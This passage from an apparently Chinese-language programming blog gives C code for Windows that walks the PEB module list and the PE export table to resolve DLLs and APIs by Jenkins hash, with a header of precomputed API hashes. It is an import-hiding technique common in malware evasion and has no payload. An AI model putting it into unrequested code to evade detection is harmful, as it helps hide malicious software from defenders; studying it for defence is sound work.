class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span>* __cdecl <span class="title function_">memset</span><span class="params">(<span class="type">void</span>*, <span class="type">int</span>, <span class="type">size_t</span>)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> intrinsic(memset)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> function(memset)</span></span><br><span class="line"><span class="type">void</span>* __cdecl <span class="title function_">memset</span><span class="params">(<span class="type">void</span>* Destination, <span class="type">int</span> Value, <span class="type">size_t</span> Size)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* p = (<span class="type">unsigned</span> <span class="type">char</span>*)Destination;</span><br><span class="line">    <span class="keyword">while</span> (Size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        *p = (<span class="type">unsigned</span> <span class="type">char</span>)Value;</span><br><span class="line">        p++;</span><br><span class="line">        Size--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Destination;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> PVOID PAPI_SET_NAMESPACE;</span><br><span class="line"><span class="keyword">typedef</span> PVOID PACTIVATION_CONTEXT;</span><br><span class="line"><span class="keyword">typedef</span> PVOID PRTL_USER_PROCESS_PARAMETERS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PWSTR  Buffer;</span><br><span class="line">&#125; UNICODE_STRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    UNICODE_STRING BaseDllName;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    WORD LoadCount;</span><br><span class="line">    WORD TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONG TimeDateStamp;</span><br><span class="line">        PVOID LoadedImports;</span><br><span class="line">    &#125;;</span><br><span class="line">    PACTIVATION_CONTEXT EntryPointActivationContext;</span><br><span class="line">    PVOID PatchInformation;</span><br><span class="line">    LIST_ENTRY ForwarderLinks;</span><br><span class="line">    LIST_ENTRY ServiceTagLinks;</span><br><span class="line">    LIST_ENTRY StaticLinks;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span> &#123;</span></span><br><span class="line">    ULONG                   Length;</span><br><span class="line">    ULONG                   Initialized;</span><br><span class="line">    PVOID                   SsHandle;</span><br><span class="line">    LIST_ENTRY              InLoadOrderModuleList;</span><br><span class="line">    LIST_ENTRY              InMemoryOrderModuleList;</span><br><span class="line">    LIST_ENTRY              InInitializationOrderModuleList;</span><br><span class="line">&#125; PEB_LDR_DATA, * PPEB_LDR_DATA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> &#123;</span></span><br><span class="line">    BOOLEAN InheritedAddressSpace;</span><br><span class="line">    BOOLEAN ReadImageFileExecOptions;</span><br><span class="line">    BOOLEAN BeingDebugged;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        BOOLEAN BitField;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            BOOLEAN ImageUsesLargePages : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsProtectedProcess : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsImageDynamicallyRelocated : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN SkipPatchingUser32Forwarders : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsPackagedProcess : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsAppContainer : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsProtectedProcessLight : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsLongPathAwareProcess : <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    HANDLE Mutant;</span><br><span class="line">    PVOID ImageBaseAddress;</span><br><span class="line">    PPEB_LDR_DATA Ldr;</span><br><span class="line">    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;</span><br><span class="line">    PVOID SubSystemData;</span><br><span class="line">    PVOID ProcessHeap;</span><br><span class="line">    PRTL_CRITICAL_SECTION FastPebLock;</span><br><span class="line">    PSLIST_HEADER AtlThunkSListPtr;</span><br><span class="line">    PVOID IFEOKey;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONG CrossProcessFlags;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG ProcessInJob : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessInitializing : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessUsingVEH : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessUsingVCH : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessUsingFTH : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessPreviouslyThrottled : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessCurrentlyThrottled : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessImagesHotPatched : <span class="number">1</span>; <span class="comment">// REDSTONE5</span></span><br><span class="line">            ULONG ReservedBits0 : <span class="number">24</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PVOID KernelCallbackTable;</span><br><span class="line">        PVOID UserSharedInfoPtr;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG SystemReserved;</span><br><span class="line">    ULONG AtlThunkSListPtr32;</span><br><span class="line">    PAPI_SET_NAMESPACE ApiSetMap;</span><br><span class="line">    ULONG TlsExpansionCounter;</span><br><span class="line">    PVOID TlsBitmap;</span><br><span class="line">    ULONG TlsBitmapBits[<span class="number">2</span>];</span><br><span class="line">    PVOID ReadOnlySharedMemoryBase;</span><br><span class="line">    PVOID SharedData;                   <span class="comment">// HotpatchInformation</span></span><br><span class="line">    PVOID* ReadOnlyStaticServerData;</span><br><span class="line">    PVOID AnsiCodePageData;             <span class="comment">// PCPTABLEINFO</span></span><br><span class="line">    PVOID OemCodePageData;              <span class="comment">// PCPTABLEINFO</span></span><br><span class="line">    PVOID UnicodeCaseTableData;         <span class="comment">// PNLSTABLEINFO</span></span><br><span class="line">    ULONG NumberOfProcessors;</span><br><span class="line">    ULONG NtGlobalFlag;</span><br><span class="line">    ULARGE_INTEGER CriticalSectionTimeout;</span><br><span class="line">    SIZE_T HeapSegmentReserve;</span><br><span class="line">    SIZE_T HeapSegmentCommit;</span><br><span class="line">    SIZE_T HeapDeCommitTotalFreeThreshold;</span><br><span class="line">    SIZE_T HeapDeCommitFreeBlockThreshold;</span><br><span class="line">    ULONG NumberOfHeaps;</span><br><span class="line">    ULONG MaximumNumberOfHeaps;</span><br><span class="line">    PVOID* ProcessHeaps;                <span class="comment">// PHEAP</span></span><br><span class="line">    PVOID GdiSharedHandleTable;</span><br><span class="line">    PVOID ProcessStarterHelper;</span><br><span class="line">    ULONG GdiDCAttributeList;</span><br><span class="line">    PRTL_CRITICAL_SECTION LoaderLock;</span><br><span class="line">    ULONG OSMajorVersion;</span><br><span class="line">    ULONG OSMinorVersion;</span><br><span class="line">    USHORT OSBuildNumber;</span><br><span class="line">    USHORT OSCSDVersion;</span><br><span class="line">    ULONG OSPlatformId;</span><br><span class="line">    ULONG ImageSubsystem;</span><br><span class="line">    ULONG ImageSubsystemMajorVersion;</span><br><span class="line">    ULONG ImageSubsystemMinorVersion;</span><br><span class="line">    KAFFINITY ActiveProcessAffinityMask;</span><br><span class="line">    ULONG GdiHandleBuffer[<span class="number">60</span>];</span><br><span class="line">    PVOID PostProcessInitRoutine;</span><br><span class="line">    PVOID TlsExpansionBitmap;</span><br><span class="line">    ULONG TlsExpansionBitmapBits[<span class="number">32</span>];</span><br><span class="line">    ULONG SessionId;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlags;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlagsUser;</span><br><span class="line">    PVOID pShimData;</span><br><span class="line">    PVOID AppCompatInfo;                        <span class="comment">// APPCOMPAT_EXE_DATA</span></span><br><span class="line">    UNICODE_STRING CSDVersion;</span><br><span class="line">    PVOID ActivationContextData;                <span class="comment">// ACTIVATION_CONTEXT_DATA</span></span><br><span class="line">    PVOID ProcessAssemblyStorageMap;            <span class="comment">// ASSEMBLY_STORAGE_MAP</span></span><br><span class="line">    PVOID SystemDefaultActivationContextData;   <span class="comment">// ACTIVATION_CONTEXT_DATA</span></span><br><span class="line">    PVOID SystemAssemblyStorageMap;             <span class="comment">// ASSEMBLY_STORAGE_MAP</span></span><br><span class="line">    SIZE_T MinimumStackCommit;</span><br><span class="line">    PVOID SparePointers[<span class="number">2</span>];                     <span class="comment">// 19H1 (previously FlsCallback to FlsHighIndex)</span></span><br><span class="line">    PVOID PatchLoaderData;</span><br><span class="line">    PVOID ChpeV2ProcessInfo;                    <span class="comment">// _CHPEV2_PROCESS_INFO</span></span><br><span class="line">    ULONG AppModelFeatureState;</span><br><span class="line">    ULONG SpareUlongs[<span class="number">2</span>];</span><br><span class="line">    USHORT ActiveCodePage;</span><br><span class="line">    USHORT OemCodePage;</span><br><span class="line">    USHORT UseCaseMapping;</span><br><span class="line">    USHORT UnusedNlsField;</span><br><span class="line">    PVOID WerRegistrationData;</span><br><span class="line">    PVOID WerShipAssertPtr;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PVOID pContextData; <span class="comment">// WIN7</span></span><br><span class="line">        PVOID pUnused; <span class="comment">// WIN10</span></span><br><span class="line">        PVOID EcCodeBitMap; <span class="comment">// WIN11</span></span><br><span class="line">    &#125;;</span><br><span class="line">    PVOID pImageHeaderHash;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONG TracingFlags;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG HeapTracingEnabled : <span class="number">1</span>;</span><br><span class="line">            ULONG CritSecTracingEnabled : <span class="number">1</span>;</span><br><span class="line">            ULONG LibLoaderTracingEnabled : <span class="number">1</span>;</span><br><span class="line">            ULONG SpareTracingBits : <span class="number">29</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONGLONG CsrServerReadOnlySharedMemoryBase;</span><br><span class="line">    PRTL_CRITICAL_SECTION TppWorkerpListLock;</span><br><span class="line">    LIST_ENTRY TppWorkerpList;</span><br><span class="line">    PVOID WaitOnAddressHashTable[<span class="number">128</span>];</span><br><span class="line">    PVOID TelemetryCoverageHeader;              <span class="comment">// REDSTONE3</span></span><br><span class="line">    ULONG CloudFileFlags;</span><br><span class="line">    ULONG CloudFileDiagFlags;                   <span class="comment">// REDSTONE4</span></span><br><span class="line">    CHAR PlaceholderCompatibilityMode;</span><br><span class="line">    CHAR PlaceholderCompatibilityModeReserved[<span class="number">7</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LEAP_SECOND_DATA</span>* <span class="title">LeapSecondData</span>;</span>   <span class="comment">// REDSTONE5</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONG LeapSecondFlags;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG SixtySecondEnabled : <span class="number">1</span>;</span><br><span class="line">            ULONG Reserved : <span class="number">31</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG NtGlobalFlag2;</span><br><span class="line">    ULONGLONG ExtendedFeatureDisableMask; <span class="comment">// since WIN11</span></span><br><span class="line">&#125; PEB, * PPEB;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))</span></span><br><span class="line">UINT32 <span class="title function_">HashStringJenkinsOneAtATime32BitA</span><span class="params">(IN PCHAR String)</span> &#123;</span><br><span class="line">    SIZE_T Index = <span class="number">0</span>;</span><br><span class="line">    UINT32 Hash = <span class="number">0</span>;</span><br><span class="line">    SIZE_T Length = <span class="built_in">strlen</span>(String);</span><br><span class="line">    <span class="keyword">while</span> (Index != Length) &#123;</span><br><span class="line">        Hash += String[Index++];</span><br><span class="line">        Hash += Hash &lt;&lt; <span class="number">7</span>; <span class="comment">// seed</span></span><br><span class="line">        Hash ^= Hash &gt;&gt; <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Hash += Hash &lt;&lt; <span class="number">3</span>;</span><br><span class="line">    Hash ^= Hash &gt;&gt; <span class="number">11</span>;</span><br><span class="line">    Hash += Hash &lt;&lt; <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">return</span> Hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_MAX_PATH256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TO_UPPER(C) C &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; C &lt;= <span class="string">&#x27;z&#x27;</span> ? C + <span class="string">&#x27;A&#x27;</span> - <span class="string">&#x27;a&#x27;</span> : C</span></span><br><span class="line">HMODULE <span class="title function_">Yes_GetModuleHandle_FromHash</span><span class="params">(IN UINT32 ui32DllHash)</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64<span class="comment">// 获取 x64 peb</span></span></span><br><span class="line">    PPEB            pPeb = (PEB*)(__readgsqword(<span class="number">0x60</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> _WIN32<span class="comment">// 获取 x86 peb</span></span></span><br><span class="line">    PPEB            pPeb = (PEB*)(__readfsdword(<span class="number">0x30</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);<span class="comment">// 获取 Ldr</span></span><br><span class="line">    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);</span><br><span class="line">    <span class="keyword">while</span> (pDte-&gt;FullDllName.Length != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        CHAR UpperCaseDllName[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pDte-&gt;FullDllName.Length; i++)<span class="comment">// 转化成大写</span></span><br><span class="line">            UpperCaseDllName[i] = (CHAR)TO_UPPER(pDte-&gt;FullDllName.Buffer[i]);</span><br><span class="line">        <span class="keyword">if</span> (ui32DllHash == HASHA(UpperCaseDllName))<span class="comment">// 判断 Hash 是否一致</span></span><br><span class="line">            <span class="keyword">return</span> pDte-&gt;InInitializationOrderLinks.Flink;<span class="comment">// 返回 DLL Base Address</span></span><br><span class="line">        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);<span class="comment">// 链表下一节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FARPROC <span class="title function_">Yes_GetProcAddress_FromHash</span><span class="params">(IN HMODULE hModule, IN UINT32 ui32FuncHash)</span> &#123;</span><br><span class="line">    PBYTE pBase = (PBYTE)hModule;<span class="comment">// 转化一下</span></span><br><span class="line">    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;<span class="comment">// 获取 DOS 头</span></span><br><span class="line">    <span class="keyword">if</span> (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)<span class="comment">// 签名检查</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);<span class="comment">// 获取 NT 头</span></span><br><span class="line">    <span class="keyword">if</span> (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)<span class="comment">// 签名检查</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-&gt;OptionalHeader;<span class="comment">// 获取可选头</span></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<span class="comment">// 获取导出目录</span></span><br><span class="line">    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);<span class="comment">// 获取函数名称数组指针</span></span><br><span class="line">    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);<span class="comment">// 获取函数地址数组指针</span></span><br><span class="line">    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);<span class="comment">// 获取函数序号数组指针</span></span><br><span class="line">    <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++)</span><br><span class="line">        <span class="keyword">if</span> (HASHA(pBase + FunctionNameArray[i]) == ui32FuncHash)<span class="comment">// 比较函数名的 Hash</span></span><br><span class="line">            <span class="keyword">return</span> (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);<span class="comment">// 通过函数序数值获取函数地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>main.h</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTA( STR, ... )\</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (1) &#123;\</span></span><br><span class="line"><span class="meta">        LPSTR buf = (LPSTR)pRtlAllocateHeap(pGetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );\</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> ( buf != NULL ) &#123;\</span></span><br><span class="line"><span class="meta">            int len = pwsprintfA( buf, STR, __VA_ARGS__ );\</span></span><br><span class="line"><span class="meta">            pWriteConsoleA( pGetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );\</span></span><br><span class="line"><span class="meta">            pHeapFree( pGetProcessHeap(), 0, buf );\</span></span><br><span class="line"><span class="meta">        &#125;\</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"></span><br><span class="line">UINT32 <span class="title function_">HashStringJenkinsOneAtATime32BitA</span><span class="params">(IN PCHAR String)</span>;</span><br><span class="line">HMODULE <span class="title function_">Yes_GetModuleHandle_FromHash</span><span class="params">(IN UINT32 ui32DllHash)</span>;</span><br><span class="line">FARPROC <span class="title function_">Yes_GetProcAddress_FromHash</span><span class="params">(IN HMODULE hModule, IN UINT32 ui32FuncHash)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// DLL Name Hash</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_NTDLL              0x4898F593</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_USER32             0x81E3778E</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_KERNEL32           0x367DC15A</span></span><br><span class="line"><span class="comment">// WIN API Name Hash</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Hash_LoadLibraryA       0x19F0EEAF</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Hash_wsprintfA          0x2AF0CBF4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Hash_HeapFree           0x1154459B</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Hash_HeapAlloc          0x2F9B708A</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Hash_RtlAllocateHeap    0xF5613878</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Hash_GetStdHandle       0x0C685B0E</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Hash_WriteConsoleA      0x65304EA1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Hash_GetProcessHeap     0x3BCCFAC6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HMODULE</span><span class="params">(WINAPI* fnLoadLibraryA)</span><span class="params">(LPCSTR lpLibFileName)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapfree</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI* fnHeapFree)</span><span class="params">(HANDLE hHeap, DWORD dwFlags, _Frees_ptr_opt_ LPVOID lpMem)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">LPVOID</span><span class="params">(WINAPI* fnHeapAlloc)</span><span class="params">(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 